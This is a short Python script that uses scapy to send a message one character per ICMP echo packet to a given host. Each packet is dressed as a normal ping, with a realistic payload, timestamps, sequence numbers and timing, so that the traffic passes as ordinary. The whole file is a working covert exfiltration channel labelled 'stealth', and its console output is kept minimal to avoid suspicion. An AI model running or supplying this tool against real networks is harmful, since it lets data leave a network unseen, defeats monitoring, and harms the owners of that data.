# pingv4.py
import sys
import time
import random
from scapy.all import IP, ICMP, send

def enviar_icmp_stealth(destino, mensaje):
    identificador = random.randint(1000, 5000)   # fijo durante toda la sesión
    secuencia = 1
    timestamp_base = int(time.time() * 1000)     # ms desde epoch

    # Payload base de un ping real (56 bytes)
    payload_base = bytearray(b"abcdefghijklmnopqrstuvwabcdefghi")  
    payload_base += b"\x00" * (56 - len(payload_base))  # padding si falta

    for caracter in mensaje + "b":  # último char siempre 'b'
        payload = payload_base[:]

        # Insertar carácter en posición 0x10 (puedes ajustar dentro del rango 0x10-0x37)
        payload[0x10] = ord(caracter)

        # Insertar timestamp en los primeros 8 bytes
        ts = int((time.time() - timestamp_base/1000) * 1000)
        payload[0:8] = ts.to_bytes(8, "big")

        paquete = IP(dst=destino)/ICMP(type=8, id=identificador, seq=secuencia)/bytes(payload)
        send(paquete, verbose=False)

        # ✅ Solo imprime esto
        print("Sent 1 packet.")

        secuencia += 1
        time.sleep(0.3)  # intervalo realista

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 pingv4.py <IP> <mensaje>")
        sys.exit(1)
    destino = sys.argv[1]
    mensaje = sys.argv[2]
    enviar_icmp_stealth(destino, mensaje)
